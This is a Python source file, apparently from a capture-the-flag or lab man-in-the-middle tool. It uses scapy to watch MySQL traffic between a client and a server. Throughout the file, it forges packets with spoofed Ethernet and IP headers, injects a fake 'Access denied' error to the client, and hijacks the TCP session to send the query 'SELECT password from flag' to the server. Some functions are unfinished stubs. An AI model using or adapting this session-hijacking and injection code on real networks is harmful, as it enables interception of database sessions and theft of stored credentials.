import scapy.all as scapy
from libs import packet as lpkt,logger as _
from lib.proto import Events, atoh, htos

log = _.log

class MySQL:
    nat     = ""

    def login(self, salt, password):
        True

    def access_denied(self, user, ip, password = False):
        return "Access denied for '{}'@'{}' (using password: {})".format(user, ip, "YES" if password else "NO")

    def deny(self, response):
        # packet length     = 0x00 0x00 0x00    (bytes on 3 octets)
        # packet number     = 0x02              (most of case 2 packets, 0x00 greetings, 0x01 login, 0x02 login)
        # response error    = 0xff              (response code, 0x00 for response ok)
        # error code        = 1504              (code: 1045)
        # SQL state         = 3238303030        (state: 28000)
        payload = "ff1504233238303030"+atoh(response)
        length = len(bytes.fromhex(payload)).to_bytes(3, 'little')
        return scapy.RAW(load=length+b"\x02"+payload.encode('utf-8'))

    def query(self, request):
        # packet length     = 0x00 0x00 0x00    (bytes on 3 octets)
        # packet number     = 0x00              (most of cases packet 0, query is the 1st)
        # MySQL query       = 0x03              (query command code)
        payload = "03"+atoh(request)
        length  = len(bytes.fromhex(payload)).to_bytes(3, 'little')
        return scapy.RAW(load=length+b"\x00"+payload.encode('utf-8'))

    def nat(self, port):
        self.layout_cli[scapy.TCP].sport = port;
        self.layout_srv[scapy.TCP].dport = port;

    def __init__(self, server, client, host):
        self.server = server
        self.client = client
        # server -> client
        # except the firsts 3 packets server only send PA
        self.layout_srv = scapy.Ether(
            src=server.mac,
            dst=host.mac
        ) / scapy.IP(
            src=server.ip,
            dst=client.ip
        ) / scapy.TCP(
            sport=3306,
            dport=10000,
            flags = "A",
            seq = 1,
            ack = 1
        )
        # client -> server
        # except the firsts 3 packets client only send PA
        self.layout_cli = scapy.Ether(
            src=host.mac,
            dst=server.mac
        ) / scapy.IP(
            src=client.ip,
            dst=server.ip
        ) / scapy.TCP(
            dport=3306,
            sport=10000,
            flags = "PA",
            seq = 1,
            ack = 79
        )

class Protocol:
    # Store the event object
    events  = None
    forge   = None
    trick   = False

    # Dectect SYN packets and increment
    def detect_syn(self, name, pkt):
        self.events.syn = self.events.syn + 1
        self.events.fin = 0
        self.forge.nat(pkt[scapy.TCP].sport)
        #if self.events.syn == 1:
        #    self.client_mac = pkt[scapy.Ether].src
        #elif self.events.syn == 2:
        #    self.server_mac = pkt[scapy.Ether].src
        #log.print("syn:\t{}".format(self.events.syn))

    # Detect Fin packet, increment for FIN, and reset for all other flags
    def detect_fin(self, name, pkt):
        self.events.ack = 0
        self.events.psh = 0
        self.events.syn = 0
        self.events.fin = self.events.fin + 1

    # Detect ACK packet and increment 
    def detect_ack(self, name, pkt):
        global log
        if not self.events.last[scapy.TCP].flags == 0x011 and not self.events.last[scapy.TCP].flags == 0x012:
            self.events.ack = self.events.ack + 1
            if self.events.ack == 1:
                self.forge.layout_srv[scapy.TCP].ack = pkt[scapy.TCP].seq
                self.forge.layout_srv[scapy.TCP].seq = pkt[scapy.TCP].ack
            else:
                scapy.sendp(self.forge.layout_cli)
        log.debug("ack:\t{}".format(self.events.ack))

    # Detect PA (PSH) Packet and increment
    def detect_psh(self, name, pkt):
        self.events.psh = self.events.psh + 1
        log.debug("psh:\t{}".format(self.events.psh))
        if self.events.psh == 2:
            trick = True
            # send response error to client
            self.forge.layout_srv[scapy.TCP].ack = self.forge.layout_srv[scapy.TCP].ack + len(pkt[scapy.TCP].load)
            scapy.sendp(self.forge.layout_srv)
            self.forge.layout_srv[scapy.TCP].flags = 'PA'
            scapy.sendp(self.forge.layout_srv / self.forge.deny(
                self.forge.access_denied('root', self.forge.client.ip, False)
                )
            )
        elif self.events.psh >= 3:
            self.forge.layout_cli.seq = pkt[scapy.TCP].ack
            self.forge.layout_cli.ack = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
            scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'))

    #def send_ack(self, name, pkt):
        # Construct the source packet
        #ack = scapy.Ether(src=self.mac,dst=self.client_mac)/lpkt.ack(error)

    # Construct and send error packet
    def send_error(self, name, pkt):
        log.print('############### name {} pkt {}'.format(name, pkt))
        if pkt[scapy.IP].src != '172.18.0.4':
            return
#        lpkt.send(lpkt.ack(pkt))
        ack = scapy.Ether(src=self.mac,dst='02:42:ac:12:00:03')/scapy.IP(src='172.18.0.2', dst='172.18.0.3')/scapy.TCP(
            dport   = pkt[scapy.TCP].sport,
            sport   = pkt[scapy.TCP].dport,
            flags   = 'A',
            seq     = pkt[scapy.TCP].ack,
            ack     = pkt[scapy.TCP].seq
        )
        lpkt.send(ack)
        # Create an error packet based on received packet
        #error = lpkt.psh(pkt, "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29")
#        error.payload = "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29"
        # sned an ACK pakct in response to received packet
        #lpkt.send(lpkt.ack(pkt))
        # Construct the source packet
        error = scapy.Ether(src=self.mac,dst='02:42:ac:12:00:03')/scapy.IP(src='172.18.0.2', dst='172.18.0.3')/scapy.TCP(
            dport   = pkt[scapy.TCP].sport,
            sport   = pkt[scapy.TCP].dport,
            flags   = 'PA',
            seq     = pkt[scapy.TCP].ack,
            #ack     = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
        ) / scapy.Raw(load="\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29")
        error.ack     = pkt[scapy.TCP].seq + len(error.load)
        # Print the error packet
        #log.packet(error)
        log.print("payload sent!")
        # Send the error packet
        lpkt.send(error)
    
    # WORK IN PROGRESS, sending the resquest packet
    def send_request(self, name, pkt):
        True

    def stop(self):
        self.events.stop()

    # Initialize the MYSQL protocol
    def __init__(self, host, victims, targets, gw, stdin = False):
        # Initialize the event handler with the source and distination IP Addresses
        self.events = Events('tcp')
        self.forge  = MySQL(victims[0], targets[0], host)
        
        # Detect Syn Packet
        self.events.add('detect syn', self.detect_syn, [
            "tcp.flags == 0x02",
        ])
        # Detect FIN Packet
        self.events.add('detect fin', self.detect_fin, [
            "tcp.flags == 'FA'",
        ])
        # Detect Ack packet
        self.events.add('detect ack', self.detect_ack, [
            "tcp.flags == 0x010",
        ])
        # Detect PSH packet
        self.events.add('detect psh', self.detect_psh, [
            "tcp.flags == 0x018",
        ])
        # Send error pack if the condition are met
        #self.events.add('send error', self.send_error, [
        #    "ack >= 1 and (tcp.flags == 'P' or tcp.flags == 'PA' or tcp.flags == 'AP')",
        #])
        # Register envent to send a request packet (Work in progress)
        #self.events.add('send request', self.send_request, [
        #    "False",
        #])
        # Register envent to send a request packet (Work in progress)
        #self.events.add('send ack', self.send_request, [
        #    "psh == 2",
        #])
        self.events.start()
        # Check the thread is stated
        log.print("condition loop thread started")